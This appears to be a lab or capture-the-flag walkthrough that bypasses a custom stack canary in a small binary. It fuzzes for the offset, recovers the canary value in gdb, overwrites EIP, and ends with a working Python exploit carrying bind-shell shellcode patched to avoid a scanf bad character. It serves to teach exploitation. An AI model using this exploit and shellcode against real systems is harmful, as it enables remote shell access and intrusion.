### Stack canary

##### Fuzzing

We can pass input to the program using stdout.
```
$ python -c "print 'A'" | ./pre2
Buff: 0xbfffef78
Got A
```

Let's try sending a lot of input to the program.
```
$ for i in {1..512};
> do python -c "print 'A' * $i" | ./pre2;
> done

. . .
Buff: 0xbfffef78
Got AAAAAAAAAAAAAAAAAAAAAAAAAAA
Buff: 0xbfffef78
Got AAAAAAAAAAAAAAAAAAAAAAAAAAAA
Buff: 0xbfffef78
Got AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
. . .
Buff: 0xbfffef78
Nope
```

What's that? The output of the program changed, but there was no segmentation fault so we did not overrun the buffer. Let's find the offset that causes this to happen:

```
#!/bin/bash

echo "Fuzzing..."
for i in {1..256}
do
	output=$(python -c "print 'A' * $i" | tee exploit | ./pre2)
	echo $output | grep 'Nope' > /dev/null
	if [ $? -eq 0 ]; then
		echo "[!] Difference in output found!"
		echo "[!] Input length: $i"
		break
	fi
done
```

```
$ chmod +x ./fuzz.sh
$ ./fuzz.sh
Fuzzing...
[!] Difference in output found!
[!] Input length: 128
```

##### Disassembly

The program is very small, and there are no extra functions that main calls other than libc ones.
If we look at the disassembly, there are some interesting parts:

```
   0x080485a9 <+140>:   mov    DWORD PTR [esp],0x8048685
   0x080485b0 <+147>:   call   0x80483c0 <puts@plt>
   0x080485b5 <+152>:   mov    DWORD PTR [esp],0x1
   0x080485bc <+159>:   call   0x80483e0 <exit@plt>
```

This looks like the logic for a custom stack canary. We know that it is custom because there is no call to stk_chk_fail.

On line 4, we see that 0x1 is moved into esp and then exit is called. This is when the program exits with an error. If we examine the string that is put on the stack before the call to puts, we should find the string Nope.

```
gdb-peda$ x/s 0x8048685                                                                         
0x8048685:      "Nope"
```

The determination whether to print Nope and exit is done in two comparisons:

```
   0x08048583 <+102>:   fld    QWORD PTR [esp+0x98]
   0x0804858a <+109>:   fld    QWORD PTR ds:0x8048690
   0x08048590 <+115>:   fucomip st,st(1)
   0x08048592 <+117>:   fstp   st(0)
   0x08048594 <+119>:   jp     0x80485a9 <main+140>
   0x08048596 <+121>:   fld    QWORD PTR [esp+0x98]
   0x0804859d <+128>:   fld    QWORD PTR ds:0x8048690
   0x080485a3 <+134>:   fucomip st,st(1)
   0x080485a5 <+136>:   fstp   st(0)
   0x080485a7 <+138>:   je     0x80485c1 <main+164>
```

It looks like something on the stack is being compared to a value at address 0x8048690.
If we examine that address, we find this:
```
gdb-peda$ x/g 0x8048690
0x8048690:      0x40501555475a31a5
```

Let's put two breakpoints at main+102 and main+140, and pass in an input of 127 bytes to see what is going on.

```
#!/usr/bin/python
# iteration 1

padding = "A" * 127

def execute():
  payload = padding
  return payload
```

```
$ ./exploit.py 1 > exploit

gdb-peda$ run < exploit
```

After hitting the first breakpoint, let's see what value is being loaded into the FPU stack to compare.
```
gdb-peda$ telescope $esp+0x90
0000| 0xbffffdc0 ("AAAAAAA")
0004| 0xbffffdc4 --> 0x414141 ('AAA')
0008| 0xbffffdc8 --> 0x475a31a5
0012| 0xbffffdcc --> 0x40501555
```

We can see that after our input, the value that is also at 0x8048690 is stored on the stack. If we send even one additional byte, the canary value is overwritten and the checks fail. The same check happens at the second jump.

So we just need to craft our input so that we preserve the canary value, and then we should be able to overflow the buffer. Bearing in mind that a string 127 bytes long is actually 128 bytes (null terminated), we will pad with 128 bytes of data.

```
#!/usr/bin/python
# iteration 1

import struct

padding = "A" * 128
canary = struct.pack("Q", 0x40501555475a31a5)

def execute():
  payload = padding + canary
  return payload
```

```
$ ./exploit.py 1 | tee exploit | ./pre2
Buff: 0xbfffef78
Got AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1ZGUP@
```

We can also see that the length of our input is 136 bytes!
```
$ ls -la exploit
-rw-r--r-- 1 jc jc 136 Jun 20 09:00 exploit
```
Now we can overflow the buffer!

##### Buffer overflow

Now, let's crash the program using a pattern string and see if we can control EIP.

```
gdb-peda$ pattern create 200 pattern

$ echo $(./exploit.py 1)$(cat pattern) > exploit

gdb-peda$ run < exploit
```

We get a segfault and find that we also control EIP!
```
EIP: 0x6e414124 ('$AAn')

gdb-peda$ pattern offset $pc
1849770276 found at offset: 12
```

This means after 128 bytes of padding, the canary value, and an additional 12 bytes, we control EIP.

The hard part is done. Let's update our script and get some shellcode on the stack to execute.

```
#!/usr/bin/python

import struct

canary_offset = 128
eip_offset = 12
payload_length = 500

def nops(n):
	return "\x90" * n
shellcode = "\xcc" * 64

pre_canary = "A" * 128
canary = struct.pack("Q", 0x40501555475a31a5)
post_canary = "B" * 12
eip = "CCCC"

def execute():
	payload = nops(32)
	payload += shellcode
	payload += nops(16)
	payload += (canary_offset - len(payload)) * "A"
	payload += canary
	payload += (eip_offset) * "B"
	payload += eip
	payload += (payload_length - len(payload)) * "C"
	return payload
```

##### Dummy Shellcode

We'll put a breakpoint before main returns so we can inspect the stack and find our NOPsled.

```
gdb-peda$ telescope 32
0000| 0xbffffd30 --> 0x8048670 ("Got %s\n")
0004| 0xbffffd34 --> 0xbffffd48 --> 0x90909090
0008| 0xbffffd38 --> 0x2
0012| 0xbffffd3c --> 0x0
0016| 0xbffffd40 --> 0xb7fffa9c --> 0xb7fd13e0 --> 0xb7fff940 --> 0x0
0020| 0xbffffd44 --> 0x1
0024| 0xbffffd48 --> 0x90909090
0028| 0xbffffd4c --> 0x90909090
0032| 0xbffffd50 --> 0x90909090
0036| 0xbffffd54 --> 0x90909090
0040| 0xbffffd58 --> 0x90909090
0044| 0xbffffd5c --> 0x90909090
0048| 0xbffffd60 --> 0x90909090
0052| 0xbffffd64 --> 0x90909090
0056| 0xbffffd68 --> 0xcccccccc
0060| 0xbffffd6c --> 0xcccccccc
0064| 0xbffffd70 --> 0xcccccccc
0068| 0xbffffd74 --> 0xcccccccc
```
Let's choose the address 0xbffffd54. It's right in the middle.

After changing our code, let's set up our alias to make sure the addresses line up.
```
alias canary="env - PWD=$PWD /full/path/tp/pre2"
./exploit.py 2 | tee exploit | canary
Buff: 0xbffffd48
Got AAAAAAAAAAAAAAAA1ZGUP@BBBBBBBBBBBBTCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
Trace/breakpoint trap (core dumped)
```

Success! We are executing our dummy shellcode!

##### Bad characters

The last thing we want is our exploit failing because our shellcode contains characters that result in only part of the exploit being copied to the buffer.

**Note:** We have moved the location of the shellcode to come **after** eip instead of before. This is because the shellcode and nops end up being very close to the 128 byte limit before the stack canary, so this makes the exploit more reliable.

```
#!/usr/bin/python

import struct

def nops(n):
	return "\x90" * n

def patch(opcodes, instructions, data):
	index = opcodes.find(instructions)
	return opcodes[:index] + data + opcodes[index+(len(instructions)):]

# x86/linux/bindport: 84 bytes
# port=16666, host=127.0.0.1
shellcode = (
    "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
    "\x43\x52\x66\x68\x41\x1a\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
    "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
    "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
    "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    "\x89\xe1\xcd\x80"
)

canary_offset = 128
eip_offset = 12
payload_length = 300

canary = struct.pack("Q", 0x40501555475a31a5)
eip = struct.pack("I", 0xbffffde0)

def execute():
	payload = canary_offset * "A"
	payload += canary
	payload += eip_offset * "B"
	payload += eip
	payload += "CCCC"
	payload += nops(64)
	payload += shellcode
	payload += nops(32)
	payload += (payload_length - len(payload)) * "E"

	return payload
```

If we run the program and check the stack at the breakpoint, we can see that our full shellcode was not copied to the stack.

```
0xbffffe20:     0x90909090      0x4353db31      0x6a026a53      0x89995866
0xbffffe30:     0x9680cde1      0x68665243      0x53661a41      0x666ae189
0xbffffe40:     0x56515058      0x80cde189      0xe3d166b0      0x525280cd
0xbffffe50:     0xe1894356      0x80cd66b0      0x59026a93      0x80cd3fb0
0xbffffe60:     0xb0f97949      0xb7fe7900      0xbffffe6c      0xb7fff940
```

It looks like at address 0xbffffe60 our shellcode is copied, but the very next address starts with a null byte where 0x0b should be. This indicates that 0x0b is a bad character. It is likely that the function handling our string (isoc99_scanf) treats 0x0b as a termination byte.

So, how do we fix it? We need to assemble the byte codes to figure out what instruction that refers to and see if we can patch the shellcode.

If we assemble the opcodes, we get the following for that instruction:

```
b0 0b   mov al, 0xb
```

This should be an easy fix. The value 0xb needs to be in the al register, but we can calculate it by doing some math instead:

```
b0 0e   mov al, 0xb
2c 03   sub al, 0x3
```

If we replace the offending bytes \xb0\x0b with our new opcodes \xb0\x0e\x2c\x03 the shellcode should fully copy to the buffer.

```
def patch(opcodes, instructions, data):
        index = opcodes.find(instructions)
        return opcodes[:index] + data + opcodes[index+(len(instructions)):]
        
# Patching for __isoc99_scanf@plt
shellcode = patch(shellcode, "\xb0\x0b", "\xb0\x0e\x2c\x03")
```

If we run our exploit now, the program doesn't segfault and just seems like it hangs. But if we check netstat, we see that there is a process listening on our port. If we connect to it, we get our shell!
